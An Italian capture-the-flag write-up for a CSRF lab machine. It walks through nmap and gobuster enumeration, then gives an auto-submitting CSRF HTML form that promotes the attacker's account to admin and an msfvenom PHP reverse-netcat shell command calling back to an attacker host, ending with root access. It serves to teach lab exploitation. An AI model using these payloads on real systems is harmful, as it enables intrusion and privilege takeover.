#  Writeup Csrf_lab

* Scanzione delle porte con `nmap`

```bash
	nmap -sCV -p22,80 172.X.X.X
```
<details close>
<summary> ✴️ HINT  Guarde risultati nmap </summary>
<p>
```bash
	# Nmap 7.991 scan initiated Mon Oct 19 20:51:44 2026 as: /usr/lib/nmap/nmap -sCV -p22,80 -oN target 172.X.X.X
	Nmap scan report for 172.18.0.3
	Host is up (0.000031s latency)
	PORT   STATE SERVICE VERSION
	2/tcp open  ssh     OpenSSH 10.0p2 Debian 7+deb13u4 (protocol 2.0)
	80/tcp open  http    Apache httpd 2.4.68 ((Debian))
	|_http-server-header: Apache/2.4.68 (Debian)
	|_http-title: Did not follow redirect to login.php
	MAC Address: E6:10:56:C5:0F:5D (Unknown)
	Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
	Service detection performed. Please report any incorrect results at https://nmap.org/submit/
	# Nmap done at Mon Oct 19 20:51:51 2026 -- 1 IP address (1 host up) scanned in 7.20 seconds
```
</p>
</details>

# Scanzione web app enumerazione

** Enumerazione del''applicazione  web con `gobuster`

```bash
	gobuster dir -u http://172.X.X.X/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100 -x php,html,js,txt -o webscan
```
<details close>
	<summary>💯  HINT Guarda result gobuster </summary>
<p>
```bash
	===============================================================
	Gobuster v3.8.2
	by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)	
	===============================================================
	[+] Url:                     http://172.18.0.3/	
	[+] Method:                  GET
	[+] Threads:                 100
	[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
	[+] Negative Status codes:   404
	[+] User Agent:              gobuster/3.8.2	
	[+] Extensions:              php,html,js,txt
	[+] Timeout:                 10s
	===============================================================
	Starting gobuster in directory enumeration mode
	===============================================================
	login.php            (Status: 200) [Size: 1357]
	register.php         (Status: 200) [Size: 1393]
	uploads              (Status: 301) [Size: 350] [--> http://172.18.0.3/uploads/]
	index.php            (Status: 302) [Size: 0] [--> login.php]
	javascript           (Status: 301) [Size: 353] [--> http://172.18.0.3/javascript/]
	logout.php           (Status: 302) [Size: 0] [--> login.php]
	dashboard.php        (Status: 302) [Size: 0] [--> login.php]
	plugin               (Status: 301) [Size: 349] [--> http://172.18.0.3/plugin/]
	server-status        (Status: 403) [Size: 315]
	Progress: 1102790 / 1102790 (100.00%)
	===============================================================
	Finished
	===============================================================
```
</p>
</details>

# Enumerazione gobuster post con account creato , enumeriamo dall'interno.

```bash
gobuster dir -u http://172.X.X.X/app_internal/ -w /usr/share/wordlists/dirb/common.txt \
	 -m POST -c 'PHPSESSID=0937127046f6bf3281cffc514e19aa13' \
	 --exclude-length 319 -t 100 -x php,html,js,txt,json
```
<details close>
	<summary>✴️ HINT guarda risultato gobuster su altro endpoint. </summary>
<p>
```bash
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.X.X.X/app_internal/
[+] Method:                  POST
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] Exclude Length:          319
[+] Cookies:                 PHPSESSID=0937127046f6bf3281cffc514e19aa13
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              php,html,js,txt,jsonls
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
.hta.jsonls          (Status: 403) [Size: 315]
.hta.txt             (Status: 403) [Size: 315]
.htaccess.php        (Status: 403) [Size: 315]
.htaccess.html       (Status: 403) [Size: 315]
admin.php            (Status: 200) [Size: 2401]
admin.php            (Status: 200) [Size: 2401]
.hta                 (Status: 403) [Size: 315]
.htaccess.jsonls     (Status: 403) [Size: 315]
.htpasswd.html       (Status: 403) [Size: 315]
.hta.js              (Status: 403) [Size: 315]
.htaccess.txt        (Status: 403) [Size: 315]
.htaccess.js         (Status: 403) [Size: 315]
.htpasswd.txt        (Status: 403) [Size: 315]
.htpasswd.jsonls     (Status: 403) [Size: 315]
.htpasswd.php        (Status: 403) [Size: 315]
.htpasswd.js         (Status: 403) [Size: 315]
.hta.html            (Status: 403) [Size: 315]
.hta.php             (Status: 403) [Size: 315]
.htaccess            (Status: 403) [Size: 315]
.htpasswd            (Status: 403) [Size: 315]
-------------------------------------------------
server.js            (Status: 200) [Size: 4227]    # trovato endpoint interno interessante
--------------------------------------------------
Progress: 27678 / 27678 (100.00%)
===============================================================
Finished
===============================================================
```
</p>
</details>

# foothold (Intrusione).
* Dopo vari test e tentativi ripetuti notiamo che l'app e vulnerabile a CSRF, bene creamo un exploit su misura


<details close>
	<summary># ✴️ HINT guarda rilultati foothold.</summary>
<p>
* NOTE: o rimosso tutti i tag <> per far si che il code sia leggibile dalla home.

```bash
DOCTYPE html
	html lang="it"
		head
			title>Sito Malevolo - CSRF Exploit /title
		/head
			body
				pCaricamento in corso.../p
				<!-- Il form punta all'endpoint vulnerabile sul container web -->
				form id="csrfForm" action="http://127.0.0.1:8080/app_internal/admin.php" method="POST" 
					<!-- ID dell'utente dell'attaccante da promuovere (es. ID 2 per analyst) -->
					input type="hidden" name="user_id" value="3"
					input type="hidden" name="new_role" value="admin"
				/form
				script
					// Esegue il submit automatico del form in background
					document.getElementById('csrfForm').submit();
				/script
			/body
	/html
```
</p>
</details>

+ Salviamolo come malicius.html e prepariamo un server web con python in attesa di richieste.

```bash
python3 -m http.server 8000
```
<details dir="close">
<summary> 🧨 Spiegazione della fase finale clicca  per espandere.</summary>
<p>
+ inviamo la richiesta dal pannello con la nostra direzione url puntando a malicius.html
+ subito dopo notiamo che riceviamo la richiesta dall wev server . apro altra pagina rieseguo il login con le credenziali create per accedere al sito e...
+ l'exploit a funzionato siamo loggati come utenti admin tramite attacco CSRF, subito dopo notiamo un pannello di amministrazione dove si puo caricare un immagine profilo
+ l'unico problema resta che accetta solo file .zip.
</p>

#  Reverseshell con `msfvenom`
```bash
msfvenom -p php/unix/cmd/reverse_netcat LHOST=172.X.X,X LPORT=4444 -f raw > shell.php
chmod +x shell.php
```
* Siamo dentro come utente www-data.

# Privilege Escalation
* dopo una lunga ricerca ed enumerazione del sistema, troviamo le credenziali per elevare i nostri privilegi.

<details close>
<summary> ✴️ HINT Guarda risultato privilege escalation </summary>
	<p>
```
		su root
		whoami
			root
```
</p>	
</details>
